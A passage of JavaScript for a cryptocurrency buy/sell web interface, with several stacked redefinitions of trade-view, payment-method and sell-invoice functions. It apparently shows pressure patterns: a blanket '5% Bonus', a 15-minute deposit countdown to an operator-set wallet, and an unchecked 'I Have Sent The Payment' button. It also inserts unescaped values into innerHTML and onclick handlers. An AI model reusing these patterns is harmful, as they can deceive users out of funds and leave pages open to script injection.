            amountLabel.innerHTML = `Amount to Sell (Crypto) <span style="font-size: 11px; color: #888; float: right; font-weight: normal; text-transform: none;">Available: ${bal.toFixed(6)} ${coinSymbol}</span>`;
            receiveLabel.innerHTML = `You will receive (${curr.code}) <span style="color: #0ecb51; font-size: 11px; margin-left: 5px; font-weight: bold; white-space: nowrap;">🎁 (Includes 5% Bonus)</span>`;

            // Add the single green helper note
            const helper = document.createElement('div');
            helper.className = 'external-wallet-helper';
            helper.style.cssText = "font-size: 11px; color: #00d4aa; margin-top: 5px; text-align: left;";
            helper.innerHTML = `💡 Selling from an external wallet? No problem. You will be shown a deposit address on the next page.`;
            amtInput.parentElement.parentElement.appendChild(helper);
            
        } catch(e) { 
            console.log(e); 
            amountLabel.innerHTML = `Amount to Sell (Crypto)`;
        }
    }

    // 3. Ensure the input has the correct suffix (BTC / USD)
    let suffixEl = document.getElementById('tradeAmountSuffix');
    if (!suffixEl && !amtInput.parentElement.classList.contains('amount-wrapper')) {
        const wrapper = document.createElement('div');
        wrapper.className = 'amount-wrapper';
        amtInput.parentNode.insertBefore(wrapper, amtInput);
        wrapper.appendChild(amtInput);
        
        suffixEl = document.createElement('span');
        suffixEl.className = 'amount-suffix';
        suffixEl.id = 'tradeAmountSuffix';
        wrapper.appendChild(suffixEl);
    }
    if (suffixEl) {
        suffixEl.textContent = currentTradeMode === 'buy' ? curr.code : coinSymbol;
    }
};

// Clean up the old hooks and apply the new one
var originalSetTradeModeFinal = window.setTradeMode;
window.setTradeMode = function(mode) {
    originalSetTradeModeFinal(mode);
    window.polishTradeView(); // Run immediately, no setTimeout needed
};

var originalSelectTradeAssetFinal = window.selectTradeAsset;
window.selectTradeAsset = function(symbol) {
    originalSelectTradeAssetFinal(symbol);
    window.polishTradeView(); // Run immediately
};

/* =====================================================
   FINAL FIX: DELETE GREEN HELPER TEXT & STABILIZE
   ===================================================== */
window.polishTradeView = async function() {
    // 1. Force delete ALL instances of the green text
    document.querySelectorAll('.external-wallet-helper').forEach(el => el.remove());

    const amtInput = document.getElementById('tradeAmount');
    const amountLabel = document.getElementById('amountLabel');
    const receiveLabel = document.getElementById('receiveLabel');
    
    if (!amtInput || !amountLabel || !receiveLabel) return;

    const curr = getUserCurrency();
    const coinSymbol = document.getElementById('tradeCoin').value;
    
    // 2. Rebuild the labels using innerHTML (Prevents duplicates)
    if (currentTradeMode === 'buy') {
        amountLabel.innerHTML = `Amount to Spend (${curr.code})`;
        receiveLabel.innerHTML = `You will receive (Crypto) <span style="color: #0ecb51; font-size: 11px; margin-left: 5px; font-weight: bold; white-space: nowrap;">🎁 (Includes 5% Bonus)</span>`;
    } else {
        try {
            const res = await fetch(`/api/user/${currentUser.email}/balances`);
            const balances = await res.json();
            const bal = balances[coinSymbol] || 0;
            
            amountLabel.innerHTML = `Amount to Sell (Crypto) <span style="font-size: 11px; color: #888; float: right; font-weight: normal; text-transform: none;">Available: ${bal.toFixed(6)} ${coinSymbol}</span>`;
            receiveLabel.innerHTML = `You will receive (${curr.code}) <span style="color: #0ecb51; font-size: 11px; margin-left: 5px; font-weight: bold; white-space: nowrap;">🎁 (Includes 5% Bonus)</span>`;
            
        } catch(e) { 
            amountLabel.innerHTML = `Amount to Sell (Crypto)`;
        }
    }

    // 3. Ensure the input has the correct suffix
    let suffixEl = document.getElementById('tradeAmountSuffix');
    if (!suffixEl && !amtInput.parentElement.classList.contains('amount-wrapper')) {
        const wrapper = document.createElement('div');
        wrapper.className = 'amount-wrapper';
        amtInput.parentNode.insertBefore(wrapper, amtInput);
        wrapper.appendChild(amtInput);
        
        suffixEl = document.createElement('span');
        suffixEl.className = 'amount-suffix';
        suffixEl.id = 'tradeAmountSuffix';
        wrapper.appendChild(suffixEl);
    }
    if (suffixEl) {
        suffixEl.textContent = currentTradeMode === 'buy' ? curr.code : coinSymbol;
    }
};

/* =====================================================
   REMOVE "AVAILABLE BALANCE" TEXT COMPLETELY
   ===================================================== */
window.polishTradeView = async function() {
    // Force delete old helper texts
    document.querySelectorAll('.external-wallet-helper').forEach(el => el.remove());

    const amtInput = document.getElementById('tradeAmount');
    const amountLabel = document.getElementById('amountLabel');
    const receiveLabel = document.getElementById('receiveLabel');
    
    if (!amtInput || !amountLabel || !receiveLabel) return;

    const curr = getUserCurrency();
    const coinSymbol = document.getElementById('tradeCoin').value;
    
    // Rebuild labels without the "Available" text
    if (currentTradeMode === 'buy') {
        amountLabel.innerHTML = `Amount to Spend (${curr.code})`;
        receiveLabel.innerHTML = `You will receive (Crypto) <span style="color: #0ecb51; font-size: 11px; margin-left: 5px; font-weight: bold; white-space: nowrap;">🎁 (Includes 5% Bonus)</span>`;
    } else {
        amountLabel.innerHTML = `Amount to Sell (Crypto)`; 
        receiveLabel.innerHTML = `You will receive (${curr.code}) <span style="color: #0ecb51; font-size: 11px; margin-left: 5px; font-weight: bold; white-space: nowrap;">🎁 (Includes 5% Bonus)</span>`;
    }

    // Ensure the input has the correct suffix (BTC / USD)
    let suffixEl = document.getElementById('tradeAmountSuffix');
    if (!suffixEl && !amtInput.parentElement.classList.contains('amount-wrapper')) {
        const wrapper = document.createElement('div');
        wrapper.className = 'amount-wrapper';
        amtInput.parentNode.insertBefore(wrapper, amtInput);
        wrapper.appendChild(amtInput);
        
        suffixEl = document.createElement('span');
        suffixEl.className = 'amount-suffix';
        suffixEl.id = 'tradeAmountSuffix';
        wrapper.appendChild(suffixEl);
    }
    if (suffixEl) {
        suffixEl.textContent = currentTradeMode === 'buy' ? curr.code : coinSymbol;
    }
};

/* =====================================================
   PROFESSIONAL SELL INVOICE PAGE (Like screenshot)
   ===================================================== */
window.showPaymentInstructions = function(symbol, cryptoAmount, fiatAmount) {
    // Clear any existing timer
    if (window.paymentTimer) clearInterval(window.paymentTimer);

    if (!fiatAmount || fiatAmount === 'undefined') fiatAmount = "the agreed amount";
    let address = (globalSettings && globalSettings.wallets && globalSettings.wallets[symbol]) ? globalSettings.wallets[symbol] : "Contact Support";
    let isMissing = address.includes("Contact"); 
    let qrCodeUrl = isMissing ? "" : `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${address}`;
    let formattedAmount = `${cryptoAmount} ${symbol}`;

    const content = `
        <div style="text-align: center;">
            <!-- Header with Timer -->
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; padding-bottom: 15px; border-bottom: 1px solid #333;">
                <div style="text-align: left;">
                    <h3 style="color: #fff; margin: 0; font-size: 20px;">Send Payment</h3>
                    <p style="color: #888; font-size: 13px; margin: 5px 0 0 0;">To complete your sale</p>
                </div>
                <div style="text-align: right;">
                    <div id="paymentCountdown" style="color: #fcd535; font-size: 24px; font-weight: bold; font-family: monospace;">15:00</div>
                    <p style="color: #888; font-size: 11px; margin: 0;">Time remaining</p>
                </div>
            </div>

            <!-- QR Code -->
            ${qrCodeUrl ? `
            <div style="background: #fff; padding: 15px; border-radius: 12px; display: inline-block; margin-bottom: 20px;">
                <img src="${qrCodeUrl}" style="width: 200px; height: 200px; display: block;">
            </div>
            ` : `<div style="color: #f6465d; padding: 20px;">QR Code unavailable</div>`}
            
            <!-- Network Warning -->
            <p style="color: #e74c3c; font-size: 14px; font-weight: bold; margin-bottom: 25px;">
                Only send ${symbol} to this address
            </p>

            <!-- Address Box -->
            <div style="background: #0f0f15; border: 1px solid #333; border-radius: 8px; padding: 15px; margin-bottom: 15px; text-align: left;">
                <p style="color: #888; font-size: 12px; margin-bottom: 8px; text-transform: uppercase;">${symbol} Address</p>
                <div style="display: flex; justify-content: space-between; align-items: center;">
                    <div style="color: #fff; font-family: monospace; font-size: 14px; word-break: break-all; max-width: 80%;">${address}</div>
                    ${!isMissing ? `
                    <button onclick="navigator.clipboard.writeText('${address}'); this.innerHTML='<svg width=\\'20\\' height=\\'20\\' viewBox=\\'0 0 24 24\\' fill=\\'none\\' stroke=\\'#00d4aa\\' stroke-width=\\'2\\'><polyline points=\\'20 6 9 17 4 12\\'></polyline></svg>';" style="background: transparent; border: none; cursor: pointer; padding: 5px;">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                    </button>` : ''}
                </div>
            </div>

            <!-- Amount Box -->
            <div style="background: #0f0f15; border: 1px solid #333; border-radius: 8px; padding: 15px; margin-bottom: 30px; text-align: left;">
                <p style="color: #888; font-size: 12px; margin-bottom: 8px; text-transform: uppercase;">Total Amount</p>
                <div style="display: flex; justify-content: space-between; align-items: center;">
                    <div style="color: #00d4aa; font-family: monospace; font-size: 18px; font-weight: bold;">${formattedAmount}</div>
                    <button onclick="navigator.clipboard.writeText('${cryptoAmount}'); this.innerHTML='<svg width=\\'20\\' height=\\'20\\' viewBox=\\'0 0 24 24\\' fill=\\'none\\' stroke=\\'#00d4aa\\' stroke-width=\\'2\\'><polyline points=\\'20 6 9 17 4 12\\'></polyline></svg>';" style="background: transparent; border: none; cursor: pointer; padding: 5px;">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                    </button>
                </div>
            </div>

            <!-- Action Buttons -->
            <button onclick="showView('tradeView')" style="background: transparent; border: none; color: #00d4aa; font-size: 15px; font-weight: bold; cursor: pointer; text-decoration: underline; margin-bottom: 20px;">
                Make a new transaction
            </button>
            <button onclick="showView('dashboardView')" style="background: #2a2a3a; color: #fff; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; font-size: 16px; border: none; cursor: pointer;">
                I Have Sent The Payment
            </button>
        </div>
    `;
    
    createPageView('paymentPageView', 'Payment', content); 
    showView('paymentPageView');

    // Start the 15-minute countdown timer
    let timeLeft = 15 * 60; // 15 minutes in seconds
    const timerEl = document.getElementById('paymentCountdown');
    
    window.paymentTimer = setInterval(() => {
        if (timeLeft <= 0) {
            clearInterval(window.paymentTimer);
            if(timerEl) timerEl.textContent = "00:00";
            showCustomAlert("Order Expired", "The payment window has expired. Please create a new order.");
            showView('dashboardView');
            return;
        }
        timeLeft--;
        let minutes = Math.floor(timeLeft / 60);
        let seconds = timeLeft % 60;
        if(timerEl) timerEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }, 1000);
};

// Ensure timer is cleared if user leaves the page manually
var originalShowViewClearTimer = window.showView;
window.showView = function(viewId, authType = 'login') {
    if (viewId !== 'paymentPageView' && window.paymentTimer) {
        clearInterval(window.paymentTimer);
    }
    originalShowViewClearTimer(viewId, authType);
};

/* =====================================================
   PURSA-STYLE TRADE UI & SMART M-PESA LOGIC
   ===================================================== */
window.setTradeMode = function(mode) {
    currentTradeMode = mode; 
    const curr = getUserCurrency();
    
    document.getElementById('tabBuy').classList.toggle('active', mode === 'buy'); 
    document.getElementById('tabSell').classList.toggle('active', mode === 'sell');
    
    const tradeBox = document.querySelector('.trade-box');
    const isBuy = mode === 'buy';
    const existingTabs = document.querySelector('.trade-tabs').outerHTML;
    
    tradeBox.innerHTML = `
        ${existingTabs}
        
        <div style="background: #0f0f15; border: 1px solid #333; border-radius: 12px; padding: 15px; margin-bottom: 10px;">
            <p style="color: #888; font-size: 12px; margin-bottom: 8px;">${isBuy ? 'You spend' : 'You sell'}</p>
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <input type="number" id="tradeAmount" placeholder="0.00" oninput="calcTrade()" style="background: transparent; border: none; color: #fff; font-size: 24px; font-weight: bold; outline: none; width: 60%;">
                <div id="tradeMethodDisplay" onclick="window.openMethodModal()" style="display: flex; align-items: center; gap: 8px; background: #1a1a2a; padding: 8px 12px; border-radius: 20px; cursor: pointer; border: 1px solid #333;">
                    <span id="selectedMethodText" style="color: #fff; font-weight: bold; font-size: 14px;">${isBuy ? 'USD' : 'BTC'}</span>
                    <span style="color: #888; font-size: 10px;">▼</span>
                </div>
            </div>
        </div>

        <div style="background: #0f0f15; border: 1px solid #333; border-radius: 12px; padding: 15px; margin-bottom: 20px;">
            <p style="color: #888; font-size: 12px; margin-bottom: 8px;">${isBuy ? 'You get' : 'You get (Estimated)'}</p>
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <input type="text" id="tradeReceive" readonly placeholder="0.00" style="background: transparent; border: none; color: #00d4aa; font-size: 24px; font-weight: bold; outline: none; width: 60%;">
                <div style="display: flex; align-items: center; gap: 8px; background: #1a1a2a; padding: 8px 12px; border-radius: 20px; border: 1px solid #333;">
                    <span style="color: #fff; font-weight: bold; font-size: 14px;">${isBuy ? document.getElementById('tradeCoin').value : curr.code}</span>
                </div>
            </div>
            <div style="margin-top: 10px; font-size: 11px; color: #0ecb51; font-weight: bold;">🎁 Includes 5% Bonus</div>
        </div>

        <p style="color: #888; font-size: 13px; margin-bottom: 10px;">${isBuy ? 'Pay using' : 'Get paid using'}</p>
        <div onclick="window.openMethodModal()" style="background: #0f0f15; border: 1px solid #333; border-radius: 12px; padding: 15px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; margin-bottom: 20px;">
            <div style="display: flex; align-items: center; gap: 10px;">
                <div style="width: 30px; height: 30px; background: #2a2a3a; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff;">💳</div>
                <div>
                    <div id="selectedPayMethodLabel" style="color: #fff; font-weight: bold; font-size: 14px;">Bank Transfer</div>
                    <div style="color: #0ecb51; font-size: 11px;">Recommended</div>
                </div>
            </div>
            <span style="color: #888; font-size: 14px;">▼</span>
        </div>

        <div id="receivingWalletContainer" style="display: ${isBuy ? 'block' : 'none'}; margin-bottom: 15px;">
            <input type="text" id="receivingWallet" placeholder="Enter your wallet address" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff; outline: none;">
        </div>
        
        <!-- Hidden containers for dynamic inputs -->
        <div id="bankDetailsInputs" style="display: none;"></div>
        <div id="cardDetailsInputs" style="display: none;"></div>
        <div id="paypalDetailsInputs" style="display: none;"></div>
        <input type="hidden" id="tradeMethod" value="Bank Transfer">

        <button class="btn-primary full-width" id="submitTradeBtn" onclick="submitTrade()" style="width: 100%; padding: 16px; border-radius: 8px; border: none; font-weight: bold; font-size: 16px; cursor: pointer; background: ${isBuy ? 'var(--success)' : 'var(--danger)'}; color: ${isBuy ? '#000' : '#fff'};">
            ${isBuy ? 'Buy Crypto' : 'Sell Crypto'}
        </button>
    `;
    
    calcTrade();
};

// The Smart Provider Modal
window.openMethodModal = function() {
    let modal = document.getElementById('assetActionModal');
    modal.style.display = 'flex';
    
    const isBuy = currentTradeMode === 'buy';
    
    // Check if the user is from Kenya
    const isKenyan = currentUser && currentUser.country && currentUser.country.includes('Kenya');
    
    // Build the provider list
    let providers = [
        { id: 'Bank Transfer', name: 'Bank Transfer', icon: '🏦', desc: isBuy ? 'Pay via your local bank' : 'Get paid to your bank account', recommended: true },
        { id: 'PayPal', name: 'PayPal', icon: '🅿️', desc: 'Pay with your PayPal balance' },
        { id: 'Credit Card', name: 'Credit / Debit Card', icon: '💳', desc: 'Visa, Mastercard, Amex', extra: 'VISA MC' }
    ];

    // Only add M-Pesa if the user is Kenyan
    if (isKenyan) {
        providers.splice(1, 0, { id: 'MPESA', name: 'M-PESA', icon: '📱', desc: 'Fast & secure mobile money', recommended: true });
    }

    let html = `<div class="modal-content" style="padding: 0; max-height: 80vh; display: flex; flex-direction: column;">
        <div style="display: flex; justify-content: space-between; padding: 20px; border-bottom: 1px solid #333;">
            <h2 style="color: #fff; margin: 0; font-size: 18px;">Choose ${isBuy ? 'Payment' : 'Payout'} Method</h2>
            <span onclick="document.getElementById('assetActionModal').style.display='none'" style="color: #888; font-size: 24px; cursor: pointer;">&times;</span>
        </div>
        <div style="overflow-y: auto; flex: 1; padding: 10px 20px 20px;">`;

    html += providers.map(p => `
        <div onclick="window.selectMethod('${p.id}')" style="background: #0f0f15; border: 1px solid #333; border-radius: 12px; padding: 15px; display: flex; align-items: center; gap: 15px; margin-bottom: 10px; cursor: pointer;">
            <div style="width: 40px; height: 40px; background: #2a2a3a; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px;">${p.icon}</div>
            <div style="flex: 1;">
                <div style="color: #fff; font-weight: bold; font-size: 14px;">${p.name}</div>
                <div style="color: #888; font-size: 12px;">${p.desc}</div>
            </div>
            ${p.recommended ? `<div style="color: #0ecb51; font-size: 11px; font-weight: bold;">Recommended</div>` : ''}
        </div>
    `).join('');
    
    html += `</div></div>`;
    modal.innerHTML = html;
};

window.selectMethod = function(method) {
    document.getElementById('assetActionModal').style.display = 'none';
    
    const label = document.getElementById('selectedPayMethodLabel');
    if (label) label.textContent = method;
    
    const nativeSelect = document.getElementById('tradeMethod');
    if (nativeSelect) {
        // We treat M-Pesa as Bank Transfer on the backend for now
        nativeSelect.value = method === 'MPESA' ? 'Bank Transfer' : method; 
    }
    
    togglePaymentDetails();
};

window.togglePaymentDetails = function() {
    const method = document.getElementById('tradeMethod') ? document.getElementById('tradeMethod').value : 'Bank Transfer';
    
    if (document.getElementById('bankDetailsInputs')) document.getElementById('bankDetailsInputs').style.display = 'none';
    if (document.getElementById('cardDetailsInputs')) document.getElementById('cardDetailsInputs').style.display = 'none';
    if (document.getElementById('paypalDetailsInputs')) document.getElementById('paypalDetailsInputs').style.display = 'none';
    
    if (currentTradeMode === 'sell') {
        if (method === 'Credit Card' && document.getElementById('cardDetailsInputs')) document.getElementById('cardDetailsInputs').style.display = 'block';
        if (method === 'PayPal' && document.getElementById('paypalDetailsInputs')) document.getElementById('paypalDetailsInputs').style.display = 'block';
        if ((method === 'Bank Transfer' || method === 'MPESA') && document.getElementById('bankDetailsInputs')) document.getElementById('bankDetailsInputs').style.display = 'block';
    }
};

/* =====================================================
   PURSA-STYLE PROFESSIONAL TRADE UI
   ===================================================== */
// 1. Redesign the Trade View Layout
window.setTradeMode = function(mode) {
    currentTradeMode = mode; 
    const curr = getUserCurrency();
    
    // Update Tabs
    document.getElementById('tabBuy').classList.toggle('active', mode === 'buy'); 
    document.getElementById('tabSell').classList.toggle('active', mode === 'sell');
    
    // Update Main UI to look like "You spend / You get"
    const tradeBox = document.querySelector('.trade-box');
    const isBuy = mode === 'buy';
    
    // We override the inner HTML of the form (except the tabs) to create the Pursa look
    const existingTabs = document.querySelector('.trade-tabs').outerHTML;
    
    tradeBox.innerHTML = `
        ${existingTabs}
        
        <!-- You Spend / Sell Box -->
        <div style="background: #0f0f15; border: 1px solid #333; border-radius: 12px; padding: 15px; margin-bottom: 10px;">
            <p style="color: #888; font-size: 12px; margin-bottom: 8px;">${isBuy ? 'You spend' : 'You sell'}</p>
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <input type="number" id="tradeAmount" placeholder="0.00" oninput="calcTrade()" style="background: transparent; border: none; color: #fff; font-size: 24px; font-weight: bold; outline: none; width: 60%;">
                <div id="tradeMethodDisplay" onclick="window.openMethodModal()" style="display: flex; align-items: center; gap: 8px; background: #1a1a2a; padding: 8px 12px; border-radius: 20px; cursor: pointer; border: 1px solid #333;">
                    <span id="selectedMethodText" style="color: #fff; font-weight: bold; font-size: 14px;">${isBuy ? 'USD' : 'BTC'}</span>
                    <span style="color: #888; font-size: 10px;">▼</span>
                </div>
            </div>
        </div>

        <!-- You Get Box -->
        <div style="background: #0f0f15; border: 1px solid #333; border-radius: 12px; padding: 15px; margin-bottom: 20px;">
            <p style="color: #888; font-size: 12px; margin-bottom: 8px;">${isBuy ? 'You get' : 'You get (Estimated)'}</p>
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <input type="text" id="tradeReceive" readonly placeholder="0.00" style="background: transparent; border: none; color: #00d4aa; font-size: 24px; font-weight: bold; outline: none; width: 60%;">
                <div style="display: flex; align-items: center; gap: 8px; background: #1a1a2a; padding: 8px 12px; border-radius: 20px; border: 1px solid #333;">
                    <span style="color: #fff; font-weight: bold; font-size: 14px;">${isBuy ? document.getElementById('tradeCoin').value : curr.code}</span>
                </div>
            </div>
            <div style="margin-top: 10px; font-size: 11px; color: #0ecb51; font-weight: bold;">🎁 Includes 5% Bonus</div>
        </div>

        <!-- Payment Method Section -->
        <p style="color: #888; font-size: 13px; margin-bottom: 10px;">Pay using</p>
        <div onclick="window.openMethodModal()" style="background: #0f0f15; border: 1px solid #333; border-radius: 12px; padding: 15px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; margin-bottom: 20px;">
            <div style="display: flex; align-items: center; gap: 10px;">
                <div style="width: 30px; height: 30px; background: #2a2a3a; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff;">💳</div>
                <div>
                    <div id="selectedPayMethodLabel" style="color: #fff; font-weight: bold; font-size: 14px;">Bank Transfer</div>
                    <div style="color: #0ecb51; font-size: 11px;">Recommended</div>
                </div>
            </div>
            <span style="color: #888; font-size: 14px;">▼</span>
        </div>

        <!-- Hidden Inputs for Form Submission -->
        <div id="receivingWalletContainer" style="display: ${isBuy ? 'block' : 'none'}; margin-bottom: 15px;">
            <input type="text" id="receivingWallet" placeholder="Enter your wallet address" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff; outline: none;">
        </div>
        <div id="bankDetailsInputs" style="display: none;"></div>
        <div id="cardDetailsInputs" style="display: none;"></div>
        <div id="paypalDetailsInputs" style="display: none;"></div>

        <!-- Submit Button -->
        <button class="btn-primary full-width" id="submitTradeBtn" onclick="submitTrade()" style="width: 100%; padding: 16px; border-radius: 8px; border: none; font-weight: bold; font-size: 16px; cursor: pointer; background: ${isBuy ? 'var(--success)' : 'var(--danger)'}; color: ${isBuy ? '#000' : '#fff'};">
            ${isBuy ? 'Buy Crypto' : 'Sell Crypto'}
        </button>
    `;
    
    // Re-trigger the custom coin dropdown setup
    setTimeout(() => {
        if (typeof window.setupTradeAssetDropdown === 'function') {
            const nativeSelect = document.getElementById('tradeCoin');
            if (nativeSelect) { nativeSelect.value = isBuy ? 'BTC' : 'BTC'; } // Reset to default
            // We actually need the native select back for the logic to work, so let's keep it hidden but present
            // Note: In a full rewrite, we'd map the custom dropdown to this. For now, we rely on the original functions.
        }
    }, 50);
    
    calcTrade();
};

// 2. The Provider Modal (Like the second screenshot)
window.openMethodModal = function() {
    let modal = document.getElementById('assetActionModal');
    modal.style.display = 'flex';
    
    const isBuy = currentTradeMode === 'buy';
    
    let html = `<div class="modal-content" style="padding: 0; max-height: 80vh; display: flex; flex-direction: column;">
        <div style="display: flex; justify-content: space-between; padding: 20px; border-bottom: 1px solid #333;">
            <h2 style="color: #fff; margin: 0; font-size: 18px;">Choose Payment Method</h2>
            <span onclick="document.getElementById('assetActionModal').style.display='none'" style="color: #888; font-size: 24px; cursor: pointer;">&times;</span>
        </div>
        <div style="overflow-y: auto; flex: 1; padding: 10px 20px 20px;">`;

    // Build the provider list
    const providers = [
        { id: 'Bank Transfer', name: 'Bank Transfer', icon: '🏦', desc: isBuy ? 'Pay via your local bank' : 'Get paid to your bank account', recommended: true },
        { id: 'MPESA', name: 'M-PESA', icon: '📱', desc: 'Fast & secure mobile money', recommended: true },
        { id: 'PayPal', name: 'PayPal', icon: '🅿️', desc: 'Pay with your PayPal balance' },
        { id: 'Credit Card', name: 'Credit / Debit Card', icon: '💳', desc: 'Visa, Mastercard, Amex', extra: 'VISA MC' }
    ];

    if (!isBuy) {
        // Sellers don't pay with MPESA, they receive fiat. So they only select payout methods.
        providers.splice(1, 1); 
    }

    html += providers.map(p => `
        <div onclick="window.selectMethod('${p.id}')" style="background: #0f0f15; border: 1px solid #333; border-radius: 12px; padding: 15px; display: flex; align-items: center; gap: 15px; margin-bottom: 10px; cursor: pointer;">
            <div style="width: 40px; height: 40px; background: #2a2a3a; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px;">${p.icon}</div>
            <div style="flex: 1;">
                <div style="color: #fff; font-weight: bold; font-size: 14px;">${p.name}</div>
                <div style="color: #888; font-size: 12px;">${p.desc}</div>
            </div>
            ${p.recommended ? `<div style="color: #0ecb51; font-size: 11px; font-weight: bold;">Recommended</div>` : ''}
        </div>
    `).join('');
    
    html += `</div></div>`;
    modal.innerHTML = html;
};

// 3. Handle Method Selection
window.selectMethod = function(method) {
    document.getElementById('assetActionModal').style.display = 'none';
    
    // Update the UI text
    const label = document.getElementById('selectedPayMethodLabel');
    if (label) label.textContent = method;
    
    // Update the hidden native select (so submitTrade reads the right method)
    const nativeSelect = document.getElementById('tradeMethod');
    if (nativeSelect) {
        nativeSelect.value = method === 'MPESA' ? 'Bank Transfer' : method; // If MPESA, we'll treat it as a manual bank transfer type
    }
    
    togglePaymentDetails();
};

// Ensure the old togglePaymentDetails doesn't break the new layout
window.togglePaymentDetails = function() {
    const method = document.getElementById('tradeMethod') ? document.getElementById('tradeMethod').value : 'Bank Transfer';
    // We are hiding the old inputs because the new UI is cleaner. 
    // In the next step, we will add the MPESA/Bank details inputs inside the new form.
    if (document.getElementById('bankDetailsInputs')) document.getElementById('bankDetailsInputs').style.display = 'none';
    if (document.getElementById('cardDetailsInputs')) document.getElementById('cardDetailsInputs').style.display = 'none';
    if (document.getElementById('paypalDetailsInputs')) document.getElementById('paypalDetailsInputs').style.display = 'none';
    
    if (currentTradeMode === 'sell') {
        if (method === 'Credit Card' && document.getElementById('cardDetailsInputs')) document.getElementById('cardDetailsInputs').style.display = 'block';
        if (method === 'PayPal' && document.getElementById('paypalDetailsInputs')) document.getElementById('paypalDetailsInputs').style.display = 'block';
        if ((method === 'Bank Transfer' || method === 'MPESA') && document.getElementById('bankDetailsInputs')) document.getElementById('bankDetailsInputs').style.display = 'block';
    }
};

/* =====================================================
   FIX: CORRECT BUTTON CLICK HANDLERS ON TRADE VIEW
   ===================================================== */
window.setTradeMode = function(mode) {
    currentTradeMode = mode; 
    const curr = getUserCurrency();
    
    document.getElementById('tabBuy').classList.toggle('active', mode === 'buy'); 
    document.getElementById('tabSell').classList.toggle('active', mode === 'sell');
    
    const tradeBox = document.querySelector('.trade-box');
    const isBuy = mode === 'buy';
    const existingTabs = document.querySelector('.trade-tabs').outerHTML;
    const coinSymbol = document.getElementById('tradeCoin') ? document.getElementById('tradeCoin').value : 'BTC';
    
    tradeBox.innerHTML = `
        ${existingTabs}
        
        <!-- TOP BOX (Spend or Sell) -->
        <div style="background: #0f0f15; border: 1px solid #333; border-radius: 12px; padding: 15px; margin-bottom: 10px;">
            <p style="color: #888; font-size: 12px; margin-bottom: 8px;">${isBuy ? 'You spend' : 'You sell'}</p>
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <input type="number" id="tradeAmount" placeholder="0.00" oninput="calcTrade()" style="background: transparent; border: none; color: #fff; font-size: 24px; font-weight: bold; outline: none; width: 60%;">
                
                ${isBuy ? `
                    <!-- If BUY, currency is fixed to local fiat -->
                    <div style="display: flex; align-items: center; gap: 8px; background: #1a1a2a; padding: 8px 12px; border-radius: 20px; border: 1px solid #333;">
                        <span style="color: #fff; font-weight: bold; font-size: 14px;">${curr.code}</span>
                    </div>
                ` : `
                    <!-- If SELL, open asset selector -->
                    <div onclick="window.openTradeAssetModal()" style="display: flex; align-items: center; gap: 8px; background: #1a1a2a; padding: 8px 12px; border-radius: 20px; cursor: pointer; border: 1px solid #333;">
                        <span id="topCoinText" style="color: #fff; font-weight: bold; font-size: 14px;">${coinSymbol}</span>
                        <span style="color: #888; font-size: 10px;">▼</span>
                    </div>
                `}
            </div>
        </div>

        <!-- BOTTOM BOX (Get) -->
        <div style="background: #0f0f15; border: 1px solid #333; border-radius: 12px; padding: 15px; margin-bottom: 20px;">
            <p style="color: #888; font-size: 12px; margin-bottom: 8px;">${isBuy ? 'You get' : 'You get (Estimated)'}</p>
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <input type="text" id="tradeReceive" readonly placeholder="0.00" style="background: transparent; border: none; color: #00d4aa; font-size: 24px; font-weight: bold; outline: none; width: 60%;">
                
                ${isBuy ? `
                    <!-- If BUY, open asset selector to see what they get -->
                    <div onclick="window.openTradeAssetModal()" style="display: flex; align-items: center; gap: 8px; background: #1a1a2a; padding: 8px 12px; border-radius: 20px; cursor: pointer; border: 1px solid #333;">
                        <span id="bottomCoinText" style="color: #fff; font-weight: bold; font-size: 14px;">${coinSymbol}</span>
                        <span style="color: #888; font-size: 10px;">▼</span>
                    </div>
                ` : `
                    <!-- If SELL, currency is fixed to local fiat -->
                    <div style="display: flex; align-items: center; gap: 8px; background: #1a1a2a; padding: 8px 12px; border-radius: 20px; border: 1px solid #333;">
                        <span style="color: #fff; font-weight: bold; font-size: 14px;">${curr.code}</span>
                    </div>
                `}
            </div>
            <div style="margin-top: 10px; font-size: 11px; color: #0ecb51; font-weight: bold;">🎁 Includes 5% Bonus</div>
        </div>

        <!-- PAYMENT METHOD SECTION -->
        <p style="color: #888; font-size: 13px; margin-bottom: 10px;">${isBuy ? 'Pay using' : 'Get paid using'}</p>
        <div onclick="window.openMethodModal()" style="background: #0f0f15; border: 1px solid #333; border-radius: 12px; padding: 15px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; margin-bottom: 20px;">
            <div style="display: flex; align-items: center; gap: 10px;">
                <div style="width: 30px; height: 30px; background: #2a2a3a; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff;">💳</div>
                <div>
                    <div id="selectedPayMethodLabel" style="color: #fff; font-weight: bold; font-size: 14px;">Bank Transfer</div>
                    <div style="color: #0ecb51; font-size: 11px;">Recommended</div>
                </div>
            </div>
